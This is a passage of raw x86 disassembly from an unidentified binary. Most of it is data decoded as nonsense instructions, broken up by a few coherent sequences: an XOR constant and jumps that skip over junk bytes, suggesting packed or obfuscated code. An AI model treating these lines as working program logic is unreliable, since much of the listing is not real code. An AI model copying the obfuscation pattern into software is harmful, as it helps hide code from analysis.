  40bbda:	mov    edx,0xa9bef935
  40bbdf:	or     esi,esi
  40bbe1:	mov    esi,0x7710e970
  40bbe6:	aas    
  40bbe7:	(bad)  
  40bbe8:	call   0xb7f7c668
  40bbed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbee:	rol    WORD PTR [eax],0x5c
  40bbf2:	out    0x7c,eax
  40bbf4:	retf   
  40bbf5:	cli    
  40bbf6:	dec    esp
  40bbf7:	and    esi,DWORD PTR [ecx]
  40bbf9:	cmp    bl,BYTE PTR [eax]
  40bbfb:	lahf   
  40bbfc:	rcl    DWORD PTR ds:0x648cdcc7,0xcb
  40bc03:	shl    BYTE PTR [edx+ebx*2],cl
  40bc06:	loopne 0x40bc20
  40bc08:	ins    DWORD PTR es:[edi],dx
  40bc09:	sub    ch,BYTE PTR [ebx+0x16]
  40bc0c:	dec    edx
  40bc0d:	in     al,0x63
  40bc0f:	mov    bh,BYTE PTR [eax]
  40bc11:	xchg   ebx,eax
  40bc12:	jno    0x40bbb1
  40bc14:	mov    al,0x3b
  40bc16:	fcomi  st,st(3)
  40bc18:	je     0x40bbed
  40bc1a:	sub    eax,0xe90c3a56
  40bc1f:	sub    DWORD PTR [edx],ebx
  40bc21:	divps  xmm2,XMMWORD PTR [edi+0x42c534b2]
  40bc28:	mov    eax,0x638b6b61
  40bc2d:	fistp  WORD PTR [ebx]
  40bc2f:	call   0x2390297
  40bc34:	mov    ebp,0xd3579441
  40bc39:	pop    ecx
  40bc3a:	dec    esi
  40bc3b:	nop
  40bc3c:	push   es
  40bc3d:	xor    ebx,DWORD PTR [eax]
  40bc3f:	add    bl,0x4d
  40bc42:	in     eax,dx
  40bc43:	rol    cl,0xce
  40bc46:	stos   BYTE PTR es:[edi],al
  40bc47:	nop
  40bc48:	mov    ebx,0x151d2c02
  40bc4d:	repz mov ah,BYTE PTR [esi+0x2261f556]
  40bc54:	mov    dl,0xad
  40bc56:	and    ebx,esp
  40bc58:	mov    esp,0x7f5b0728
  40bc5d:	push   eax
  40bc5e:	loop   0x40bc6f
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	mov    eax,ds:0xc654aee7
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	fidiv  DWORD PTR [ebp-0x7f]
  40bca4:	clc    
  40bca5:	ror    al,0x6c
  40bca8:	sbb    eax,0xf349ed2
  40bcad:	mov    edx,0x2eb910d0
  40bcb2:	jb     0x40bc93
  40bcb4:	jo     0x40bd26
  40bcb6:	add    DWORD PTR [ecx],0xffffffe0
  40bcb9:	sbb    edx,DWORD PTR [edx-0x77c2a434]
  40bcbf:	popa   
  40bcc0:	vunpckhps ymm6,ymm7,YMMWORD PTR [ecx+eax*4]
  40bcc5:	(bad)  [edi]
  40bcc7:	mov    ecx,0xd4706d3b
  40bccc:	in     al,dx
  40bccd:	mov    esi,0x49ba9b5b
  40bcd2:	outs   dx,DWORD PTR ds:[esi]
  40bcd3:	les    esi,FWORD PTR [ebx-0x12e7db87]
  40bcd9:	icebp  
  40bcda:	jmp    0x40bd50
  40bcdc:	imul   edi
  40bcde:	jecxz  0x40bcce
  40bce0:	adc    eax,0xc59a7294
  40bce5:	mov    dl,0xa5
  40bce7:	inc    ecx
  40bce8:	sbb    DWORD PTR [ecx-0x589c3418],0x8a78cdb6
  40bcf2:	retf   
  40bcf3:	mov    al,ds:0x71f558e6
  40bcf8:	inc    esp
  40bcf9:	ins    DWORD PTR es:[edi],dx
  40bcfa:	ins    DWORD PTR es:[edi],dx
  40bcfb:	popa   
  40bcfc:	sbb    esi,DWORD PTR [ebx+0x338609bc]
  40bd02:	xchg   edi,eax
  40bd03:	test   al,0x5f
  40bd05:	mov    eax,ds:0x2ef4dc88
  40bd0a:	mov    esi,0xb62aaeb2
  40bd0f:	jecxz  0x40bd6f
  40bd11:	sub    BYTE PTR [eax-0x7c],bl
  40bd14:	lock pop ecx
  40bd16:	pop    ds
  40bd17:	aad    0xa0
  40bd19:	add    al,0x68
  40bd1b:	pop    edx
  40bd1c:	xchg   edi,eax
  40bd1d:	rol    DWORD PTR ds:0x7abdc529,0xb5
  40bd24:	pop    ds
  40bd25:	in     al,0xb0
  40bd27:	jmp    0x40bcfd
  40bd29:	xchg   esi,eax
  40bd2a:	fisubr WORD PTR [esi+eax*1+0x6342262d]
  40bd31:	mov    bl,0x40
  40bd33:	sub    eax,DWORD PTR [eax+0x1b71aa2c]
  40bd39:	xor    BYTE PTR [esi+0x5],al
  40bd3c:	(bad)  
  40bd3d:	dec    esi
  40bd3e:	(bad)  [edx]
  40bd40:	push   ebp
  40bd41:	mov    ch,0x1c
  40bd43:	out    0x1f,eax
  40bd45:	pop    esi
  40bd46:	push   0xe95ea020
  40bd4b:	mov    dh,0xdc
  40bd4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd4e:	mov    ecx,DWORD PTR [ebx]
  40bd50:	or     DWORD PTR [ecx+0x2f],0xbbb44947
  40bd57:	(bad)  
  40bd58:	mov    dl,0xf
  40bd5a:	dec    edi
  40bd5b:	shl    edi,cl
  40bd5d:	ror    al,0xd2
  40bd60:	cmc    
  40bd61:	cmc    
  40bd62:	jnp    0x40bd87
  40bd64:	iret   
  40bd65:	dec    ecx
  40bd66:	jo     0x40bdba
  40bd68:	inc    edx
  40bd69:	xchg   ebp,eax
  40bd6a:	popf   
  40bd6b:	fiadd  WORD PTR [ecx]
  40bd6d:	aad    0x16
  40bd6f:	std    
  40bd70:	in     al,0x97
  40bd72:	adc    eax,0xf4b1b319
  40bd77:	paddsb mm7,mm0
  40bd7a:	mov    edx,gs
  40bd7c:	xor    BYTE PTR [esi+0xe],ch
  40bd7f:	loopne 0x40bdfa
  40bd81:	fs int3 
  40bd83:	mov    ch,0x81
  40bd85:	inc    ebp
  40bd86:	jne    0x40bd3f
  40bd88:	xchg   edi,eax
  40bd89:	and    al,0x2a
  40bd8b:	fwait
  40bd8c:	bound  ecx,QWORD PTR [eax-0x49]
  40bd8f:	data16 sbb BYTE PTR [ebx-0x101f5c46],0x41
  40bd97:	das    
  40bd98:	(bad)  
  40bd99:	and    ebx,DWORD PTR ss:0x84638f02
  40bda0:	pop    ds
  40bda1:	push   eax
  40bda2:	test   BYTE PTR ds:0x34665847,dh
  40bda8:	cmp    ebp,ebx
  40bdaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdab:	dec    esp
  40bdac:	dec    esp
  40bdad:	rol    BYTE PTR [ebx],0xd6
  40bdb0:	aad    0x3
  40bdb2:	mov    eax,0xf2a828e1
  40bdb7:	xchg   edx,eax
  40bdb8:	sahf   
  40bdb9:	sub    ah,ch
  40bdbb:	or     ch,BYTE PTR [edi]
  40bdbd:	mov    ebp,0xd26f2530
  40bdc2:	call   0x8878:0x327411ed
  40bdc9:	mov    al,0xf3
  40bdcb:	out    dx,eax
  40bdcc:	mov    bh,0xa8
  40bdce:	ror    DWORD PTR [eax],1
  40bdd0:	jnp    0x40be0f
  40bdd2:	mov    ebx,0x531d4a19
  40bdd7:	xor    DWORD PTR [eax+0x70],esi
  40bdda:	or     DWORD PTR [edx],ebx
  40bddc:	jl     0x40be48
  40bdde:	aas    
  40bddf:	nop
  40bde0:	xchg   ebp,eax
  40bde1:	dec    ebp
  40bde2:	xchg   BYTE PTR [edi],bh
  40bde4:	test   eax,0x3cbf40bf
  40bde9:	or     eax,0xaeffefea
  40bdee:	or     al,0xdd
  40bdf0:	push   ecx
  40bdf1:	lds    eax,FWORD PTR [edi-0x4b]
  40bdf4:	imul   ebp,DWORD PTR [esi-0x5887d8a0],0xffffff88
  40bdfb:	mov    eax,0x8aa6c2a5
  40be00:	aas    
  40be01:	hlt    
  40be02:	inc    edx
  40be03:	mov    dh,BYTE PTR [eax+0x7]
  40be06:	mov    ecx,0x45103ab9
  40be0b:	sub    al,0x91
  40be0d:	scas   al,BYTE PTR es:[edi]
  40be0e:	or     DWORD PTR [edi],ebp
  40be10:	pop    eax
  40be11:	and    edx,DWORD PTR [eax-0x1bd331e5]
  40be17:	mov    ebx,0x9c5e64c2
  40be1c:	push   edx
  40be1d:	ror    BYTE PTR [esi+0x24],1
  40be20:	inc    esp
  40be21:	mov    dh,0x23
  40be23:	add    bh,BYTE PTR [ebx+0x64]
  40be26:	push   ebp
  40be27:	lds    esi,FWORD PTR [esi-0x459bd964]
  40be2d:	pop    ebp
  40be2e:	ins    DWORD PTR es:[edi],dx
  40be2f:	mov    BYTE PTR [esi+ebp*1],bl
  40be32:	xor    al,0xe4
  40be34:	ds bound eax,QWORD PTR cs:[eax+ebx*8+0x56]
  40be3a:	dec    esi
  40be3b:	sbb    BYTE PTR [edx+0x57],bh
  40be3e:	pop    ecx
  40be3f:	jmp    0xb8249812
  40be44:	sub    edi,DWORD PTR [eax-0x2341f48a]
  40be4a:	mov    al,ds:0x7b33d8fe
  40be4f:	mov    BYTE PTR [eax],dl
  40be51:	lods   al,BYTE PTR ds:[esi]
  40be52:	and    BYTE PTR [edx],ch
  40be54:	cmc    
  40be55:	dec    esi
  40be56:	inc    eax
  40be57:	(bad)  
  40be58:	(bad)  
  40be59:	jo     0x40be0f
  40be5b:	enter  0x241c,0x6e
  40be5f:	push   esp
  40be60:	mov    ebp,es
  40be62:	fwait
  40be63:	or     eax,0x1f9a4479
  40be68:	ins    DWORD PTR es:[edi],dx
  40be69:	ret    0x8498
  40be6c:	xchg   ebx,eax
  40be6d:	push   cs
  40be6e:	rol    bh,1
  40be70:	loopne 0x40be91
  40be72:	in     al,0x71
  40be74:	mov    WORD PTR [ecx-0x4273b11f],cs
  40be7a:	mov    ds:0x2fc31eba,eax
  40be7f:	icebp  
  40be80:	int3   
  40be81:	pushf  
  40be82:	add    dh,BYTE PTR [ebp-0x78]
  40be85:	aaa    
  40be86:	test   BYTE PTR [eax+0x6b],0xe2
  40be8a:	dec    esp
  40be8b:	dec    esp
  40be8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be8d:	ret    0x8bb9
  40be90:	jnp    0x40be57
  40be92:	mov    esi,0x8b35a5e
  40be97:	jmp    0x40be5f
  40be99:	daa    
  40be9a:	out    0x9d,eax
  40be9c:	push   ds
  40be9d:	rcl    DWORD PTR [ecx-0x343a3bc4],cl
  40bea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea4:	push   eax
  40bea5:	mov    cl,0x2f
  40bea7:	mov    WORD PTR [ebx+0x11],cs
  40beaa:	sti    
  40beab:	je     0x40be8e
  40bead:	xchg   DWORD PTR [ecx+0x21],ebp
  40beb0:	jl     0x40be73
  40beb2:	repnz mov ebp,0x1e826f71
  40beb8:	(bad)  
  40beb9:	mov    dl,0xee
  40bebb:	ret    
  40bebc:	push   ds
  40bebd:	xchg   ebx,eax
  40bebe:	or     dh,BYTE PTR [ecx]
  40bec0:	call   0x5f11:0xae0def58
  40bec7:	or     ah,dl
  40bec9:	xor    eax,0xd6fc4fa8
  40bece:	push   eax
  40becf:	ins    BYTE PTR es:[edi],dx
  40bed0:	std    
  40bed1:	ret    
  40bed2:	xlat   BYTE PTR ds:[ebx]
  40bed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bed6:	mov    ebx,0x63f3de0
  40bedb:	xchg   DWORD PTR [esi-0x3d],esp
  40bede:	idiv   DWORD PTR ds:0x50184501
  40bee4:	(bad)  
  40bee5:	mov    dl,BYTE PTR [edx]
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x73d346cf]
  40bf27:	push   0xffffff80
  40bf29:	stc    
  40bf2a:	jle    0x40bfaa
  40bf2c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bf30:	test   DWORD PTR [esi+0x75],ebp
  40bf33:	call   0x3650f170
  40bf38:	adc    DWORD PTR [esi-0x6],edx
  40bf3b:	lea    esp,[edx]
  40bf3d:	push   esi
  40bf3e:	out    0x66,eax
  40bf40:	xchg   DWORD PTR [edi+0x1d7bbe14],ecx
  40bf46:	sub    al,0x37
  40bf48:	or     BYTE PTR [ebp+ebx*8+0x63],bh
  40bf4c:	jg     0x40bfbe
  40bf4e:	mov    WORD PTR [ecx],gs
  40bf50:	add    DWORD PTR [esi+0x1],esp
  40bf53:	mov    esp,0x386c2ebc
  40bf58:	ja     0x40bee3
  40bf5a:	mov    al,ds:0xe949ba61
  40bf5f:	mov    BYTE PTR [esi+0x3cbe7134],al
  40bf65:	add    al,0x87
  40bf67:	adc    ecx,ebp
  40bf69:	cmp    ecx,esi
  40bf6b:	out    dx,eax
  40bf6c:	daa    
  40bf6d:	adc    al,0xff
  40bf6f:	or     dl,bh
  40bf71:	mov    esi,0x27a3b965
  40bf76:	xchg   ebp,eax
  40bf77:	call   0xbfc109c9
  40bf7c:	fwait
  40bf7d:	mov    esp,0xfe47fe2b
  40bf82:	jg     0x40bf0c
  40bf84:	jbe    0x40bfee
  40bf86:	call   0x4007:0x91d3b48b
  40bf8d:	imul   ecx,DWORD PTR [esi-0x66],0xfffffffb
  40bf91:	mov    ds:0xea745861,eax
  40bf96:	mov    bl,0xa5
  40bf98:	pop    ds
  40bf99:	rcr    DWORD PTR [edi],cl
  40bf9b:	jmp    0x1b0cc3be
  40bfa0:	push   esp
  40bfa1:	fs enter 0xb2e6,0xfe
  40bfa6:	addr16 dec esi
  40bfa8:	mov    dl,dl
  40bfaa:	xor    al,ah
  40bfac:	sub    eax,DWORD PTR [edx+0x73]
  40bfaf:	sti    
  40bfb0:	scas   eax,DWORD PTR es:[edi]
  40bfb1:	int    0xb4
  40bfb3:	jecxz  0x40c018
  40bfb5:	push   eax
  40bfb6:	call   0x5235:0x2544c643
  40bfbd:	and    ecx,DWORD PTR [edx]
  40bfbf:	(bad)  
  40bfc0:	dec    eax
  40bfc1:	dec    ebx
  40bfc2:	sub    esi,DWORD PTR [esi+0x1bd684e4]
  40bfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc9:	mov    esp,0x225b63fa
  40bfce:	or     esi,eax
  40bfd0:	xchg   ecx,esp
  40bfd2:	dec    ebx
  40bfd3:	stc    
  40bfd4:	je     0x40bffa
  40bfd6:	std    
  40bfd7:	dec    eax
  40bfd8:	retf   0x6eb1
  40bfdb:	int3   
  40bfdc:	(bad)  
  40bfdd:	dec    esp
  40bfde:	add    al,0xd7
  40bfe0:	enter  0x20b5,0xf1
  40bfe4:	jmp    0x40c047
  40bfe6:	jmp    0x492a:0x58ebcc
  40bfed:	ds addr16 (bad) 
  40bff0:	loop   0x40bf8c
  40bff2:	or     eax,esi
  40bff4:	out    dx,al
  40bff5:	jbe    0x40bf95
  40bff7:	test   al,0x81
  40bff9:	mov    BYTE PTR [ebx+0x29b36cb1],bl
  40bfff:	fild   WORD PTR [ebx+0xb]
  40c002:	gs push eax
  40c004:	and    al,0x4e
  40c006:	ret    0x2edb
  40c009:	jl     0x40bfb8
  40c00b:	in     eax,dx
  40c00c:	imul   esp,esp,0x70
  40c00f:	inc    esp
  40c010:	mov    BYTE PTR [ecx+0x42],ch
  40c013:	push   ebp
  40c014:	rol    BYTE PTR [esi-0x6d1cb9f6],0x0
  40c01b:	mov    BYTE PTR [edi-0x7e66017],dh
  40c021:	pushf  
  40c022:	push   ebx
  40c023:	pop    es
  40c024:	stc    
  40c025:	das    
  40c026:	add    BYTE PTR [edi-0x5f860383],bh
  40c02c:	sahf   
  40c02d:	ja     0x40c03c
  40c02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c030:	mov    al,0x78
  40c032:	loopne 0x40bfea
  40c034:	add    esi,ebx
  40c036:	dec    eax
  40c037:	rcl    eax,cl
  40c039:	addr16 inc esi
  40c03b:	push   es
  40c03c:	xchg   ebx,eax
  40c03d:	outs   dx,DWORD PTR ds:[esi]
  40c03e:	sar    DWORD PTR [ecx],1
  40c040:	push   eax
  40c041:	xlat   BYTE PTR ds:[ebx]
  40c042:	sub    ah,BYTE PTR [esi+0x19]
  40c045:	lods   al,BYTE PTR ds:[esi]
  40c046:	mov    dl,0x78
  40c048:	add    edx,esi
  40c04a:	add    al,0xbf
  40c04c:	or     eax,0x4341c358
  40c051:	xlat   BYTE PTR ds:[ebx]
  40c052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c053:	mov    cl,0x4d
  40c055:	sbb    al,0x2
  40c057:	inc    ecx
  40c058:	and    eax,0x8eb95d28
  40c05d:	push   ds
  40c05e:	sbb    dl,BYTE PTR [ecx]
  40c060:	jecxz  0x40c024
  40c062:	imul   ebp,DWORD PTR [eax+0x76],0x67
  40c066:	mov    ds:0x600415d7,eax
  40c06b:	test   eax,0x35f215b5
  40c070:	es pop esi
  40c072:	push   esi
  40c073:	mov    edx,0x25cf8a22
  40c078:	jae    0x40c0aa
  40c07a:	add    ch,BYTE PTR ds:0x62c2da33
  40c080:	xchg   esp,eax
  40c081:	pop    DWORD PTR [ebx]
  40c083:	jecxz  0x40c048
  40c085:	call   0x5dd99fca
  40c08a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c08b:	call   0x56163198
  40c090:	fwait
  40c091:	sbb    DWORD PTR [esi-0x4a],edi
  40c094:	push   ecx
  40c095:	fs (bad) 
  40c097:	xchg   ebx,eax
  40c098:	in     eax,0x94
  40c09a:	jns    0x40c05a
  40c09c:	pop    esi
  40c09d:	imul   edi,DWORD PTR [ebp+0x60],0xe8f6767c
  40c0a4:	add    BYTE PTR ds:0xde638857,ch
  40c0aa:	mov    esp,0x3d2a124e
  40c0af:	jge    0x40c032
  40c0b1:	bound  edx,QWORD PTR [edx-0x676bc02c]
  40c0b7:	enter  0xae3f,0xd0
  40c0bb:	(bad)  
  40c0bd:	rol    eax,1
  40c0bf:	imul   esp,ecx,0xb262a35e
  40c0c5:	push   eax
  40c0c6:	xor    ebx,DWORD PTR [ecx+edi*4-0x7ca7d215]
  40c0cd:	imul   ecx,ebp,0xfffffffc
  40c0d0:	ss push esi
  40c0d2:	jmp    0x36ee:0x50c1020c
  40c0d9:	es lahf 
  40c0db:	neg    bl
  40c0dd:	call   0x3cdd61d1
  40c0e2:	cmp    edi,ecx
  40c0e4:	ss pop edi
  40c0e6:	and    eax,DWORD PTR [ecx-0x28d40207]
  40c0ec:	push   eax
  40c0ed:	cwde   
  40c0ee:	retf   0x4c25
  40c0f1:	cwde   
  40c0f2:	xchg   ecx,eax
  40c0f3:	push   ecx
  40c0f4:	pop    ss
  40c0f5:	mov    esi,0xca19b401
  40c0fa:	imul   esp,edi,0xffffffc1
  40c0fd:	or     BYTE PTR [ebx+esi*1-0x76be311d],ch
  40c104:	mov    es,ebp
  40c106:	leave  
  40c107:	add    eax,0x410546
  40c10c:	pop    edx
  40c10d:	cwde   
  40c10e:	add    dh,BYTE PTR [edi]
  40c110:	stc    
  40c111:	pop    ecx
  40c112:	outs   dx,DWORD PTR ds:[esi]
  40c113:	lahf   
  40c114:	jne    0x40c0e0
  40c116:	and    al,0x8c
  40c118:	inc    esi
  40c119:	adc    DWORD PTR [edx],edi
  40c11b:	cmp    ebp,DWORD PTR [edx-0x75f160fc]
  40c121:	sbb    BYTE PTR [edx+0x65aef28],dl
  40c127:	push   ecx
  40c128:	cmc    
  40c129:	imul   esp,DWORD PTR [edx-0x17],0x8e2bb2e8
  40c130:	or     ah,BYTE PTR [ebp-0x20f01adb]
  40c136:	sub    al,0x95
  40c138:	inc    edx
  40c139:	mov    cs,WORD PTR [edx+0x71]
  40c13c:	rol    DWORD PTR [eax+0x6cc892b2],0xa8
  40c143:	inc    eax
  40c144:	dec    edi
  40c145:	mov    DWORD PTR [ecx],esi
  40c147:	mov    DWORD PTR ds:[ebp+0x5f3214a5],ecx
  40c14e:	jb     0x40c114
  40c150:	mov    ecx,0x25402026
  40c155:	sub    bh,dl
  40c157:	iret   
  40c158:	repz clc 
  40c15a:	pop    ss
  40c15b:	jno    0x40c135
  40c15d:	in     eax,dx
  40c15e:	aas    
  40c15f:	push   edi
  40c160:	pushf  
  40c161:	hlt    
  40c162:	(bad)  
  40c163:	xchg   ebp,eax
  40c164:	js     0x40c161
  40c166:	ret    
  40c167:	or     eax,0x68ffed78
  40c16c:	lods   al,BYTE PTR ds:[esi]
  40c16d:	daa    
  40c16e:	in     al,dx
  40c16f:	outs   dx,DWORD PTR ds:[esi]
  40c170:	mov    edx,0xe91f37cf
  40c175:	jle    0x40c0fe
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xd9
  40c196:	mov    ebx,0x874a790b
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	rcr    BYTE PTR [edi+0x5e],cl
  40c1a4:	xor    bl,BYTE PTR [eax]
  40c1a6:	and    al,BYTE PTR [esp+eiz*2-0x59]
  40c1aa:	daa    
  40c1ab:	scas   eax,DWORD PTR es:[edi]
  40c1ac:	jecxz  0x40c174
  40c1ae:	xor    al,ch
  40c1b0:	(bad)
  40c1b3:	in     eax,dx
  40c1b4:	add    BYTE PTR [ebx-0x372ad222],ah
  40c1ba:	int    0x30
  40c1bc:	stos   DWORD PTR es:[edi],eax
  40c1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1be:	dec    edx
  40c1bf:	rcl    BYTE PTR [ebx],cl
  40c1c1:	mov    al,bh
  40c1c3:	mov    esp,0xb785ebd4
  40c1c8:	(bad)  
  40c1ca:	cmp    al,0xfa
  40c1cc:	xchg   BYTE PTR [ecx],ch
  40c1ce:	ret    0x3a4d
  40c1d1:	std    
  40c1d2:	repnz xor eax,0xb42da24
  40c1d8:	dec    ebx
  40c1d9:	cmp    eax,0xd4ed1c8d
  40c1de:	or     DWORD PTR [ecx+0x7b8ab053],edi
  40c1e4:	mov    ss:0x5968e5af,eax
  40c1ea:	push   ecx
  40c1eb:	leave  
  40c1ec:	dec    esi
  40c1ed:	div    edx
  40c1ef:	add    DWORD PTR [edi-0x2973ca27],0x22
  40c1f6:	push   edi
  40c1f7:	sub    al,BYTE PTR [ebp+0x7a]
  40c1fa:	xor    BYTE PTR [esi+0x62ee25d],bl
  40c200:	xchg   edi,eax
  40c201:	xor    bh,cl
  40c203:	fiadd  DWORD PTR [ebx]
  40c205:	mov    DWORD PTR [edi+ebp*4],ecx
  40c208:	push   ds
  40c209:	mov    dl,0xbd
  40c20b:	stos   BYTE PTR es:[edi],al
  40c20c:	cmp    eax,0xb9f02d26
  40c211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c212:	sub    DWORD PTR [edi-0xe],ecx
  40c215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c216:	aaa    
  40c217:	dec    edx
  40c218:	xchg   ebx,eax
  40c219:	sbb    bh,BYTE PTR [esi-0x70]
  40c21c:	fiadd  WORD PTR ds:0x471942fc
  40c222:	jmp    0x25c5:0x3f9d29e3
  40c229:	xchg   esp,eax
  40c22a:	fldcw  WORD PTR fs:[esi]
  40c22d:	arpl   WORD PTR [esi+ebp*2-0x51c0612d],cx
  40c234:	enter  0xa1e,0x62
  40c238:	push   esi
  40c239:	ret    0xc2f8
  40c23c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c23d:	adc    ecx,DWORD PTR [eax+ecx*2]
  40c240:	scas   al,BYTE PTR es:[edi]
  40c241:	outs   dx,DWORD PTR ds:[esi]
  40c242:	pop    edi
  40c243:	inc    esi
  40c244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c246:	xor    BYTE PTR [edx-0x6a],0x3c
  40c24a:	mov    eax,ecx
  40c24c:	js     0x40c1f1
  40c24e:	push   ecx
  40c24f:	leave  
  40c250:	or     dh,ah
  40c252:	outs   dx,BYTE PTR ds:[esi]
  40c253:	dec    esp
  40c254:	dec    esi
  40c255:	push   ebp
  40c256:	outs   dx,DWORD PTR ds:[esi]
  40c257:	sbb    ecx,eax
  40c259:	mov    ch,0x2b
  40c25b:	loopne 0x40c1e3
  40c25d:	cmp    DWORD PTR [edx],0xffffffa2
  40c260:	in     eax,dx
  40c261:	out    0xa5,al
  40c263:	inc    al
  40c265:	jg     0x40c21c
  40c267:	and    ecx,DWORD PTR [esi+0x15399853]
  40c26d:	les    ebp,FWORD PTR [ebx]
  40c26f:	add    eax,0x89ef0d76
  40c274:	cwde   
  40c275:	ffree  st(3)
  40c277:	les    ebp,FWORD PTR [eax]
  40c279:	mov    dl,0xb5
  40c27b:	(bad)  
  40c27d:	ror    BYTE PTR [edx-0x31],1
  40c280:	icebp  
  40c281:	int    0x3e
  40c283:	xor    eax,0x78d3fa69
  40c288:	adc    DWORD PTR [eax],esi
  40c28a:	cmp    ebp,DWORD PTR [edx-0x47]
  40c28d:	lods   al,BYTE PTR ds:[esi]
  40c28e:	add    BYTE PTR [edi+ebx*4],al
  40c291:	mov    dl,0xa6
  40c293:	inc    ecx
  40c294:	int3   
  40c295:	es push eax
  40c297:	push   edx
  40c298:	dec    eax
  40c299:	push   ecx
  40c29a:	sbb    al,BYTE PTR ds:0x4f4ba10a
  40c2a0:	(bad)  
  40c2a1:	mov    bl,0xca
  40c2a3:	pop    edi
  40c2a4:	or     BYTE PTR [eax+0x636020de],dl
  40c2aa:	add    al,0xf6
  40c2ac:	jecxz  0x40c29f
  40c2ae:	adc    dl,BYTE PTR [ebx+ebx*4-0x40]
  40c2b2:	jp     0x40c2ce
  40c2b4:	jmp    0xa3d2726
  40c2b9:	retf   0xe81f
  40c2bc:	mov    ds:0x87ceaaf6,al
  40c2c1:	mov    ah,0x37
  40c2c3:	sub    BYTE PTR [ebx-0x16f67386],bl
  40c2c9:	std    
  40c2ca:	sub    esp,DWORD PTR [edx+0x37dee513]
  40c2d0:	or     eax,edx
  40c2d2:	cld    
  40c2d3:	cmovb  edx,DWORD PTR [ecx+0x2c]
  40c2d7:	fiadd  DWORD PTR [esi+0x140d6600]
  40c2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2de:	loopne 0x40c2c7
  40c2e0:	ud2    
  40c2e2:	push   ecx
  40c2e3:	ror    DWORD PTR [esi+0x74],1
  40c2e6:	(bad)  
  40c2e7:	aaa    
  40c2e8:	fs mov cl,0x9a
  40c2eb:	cmp    DWORD PTR [esi],ebx
  40c2ed:	ins    BYTE PTR es:[edi],dx
  40c2ee:	cld    
  40c2ef:	les    ebp,FWORD PTR [ecx+0x7513d02c]
  40c2f5:	sar    BYTE PTR [edx+0x1f],cl
  40c2f8:	mov    bh,0xbd
  40c2fa:	mov    ebx,0x4456756
  40c2ff:	(bad)  
  40c301:	sbb    DWORD PTR [ebx-0x13],ebp
  40c304:	stc    
  40c305:	loope  0x40c325
  40c307:	adc    al,0xd4
  40c309:	or     bh,bh
  40c30b:	add    al,0x8c
  40c30d:	cmc    
  40c30e:	mov    BYTE PTR [edi-0x42],ch
  40c311:	mov    ch,0x4e
  40c313:	dec    edi
  40c314:	ficomp DWORD PTR [esi+0x70]
  40c317:	aam    0x35
  40c319:	mov    ah,0x9
  40c31b:	mov    al,ah
  40c31d:	(bad)  
  40c31e:	cmp    edi,ecx
  40c320:	fdivr  DWORD PTR [ebx+0x25]
  40c323:	mov    al,ds:0xe9f856de
  40c328:	mov    esi,0x3c6a26ad
  40c32d:	(bad)  
  40c32e:	add    eax,0x5949319
  40c333:	push   ebp
  40c334:	popf   
  40c335:	loop   0x40c340
  40c337:	movaps xmm7,xmm7
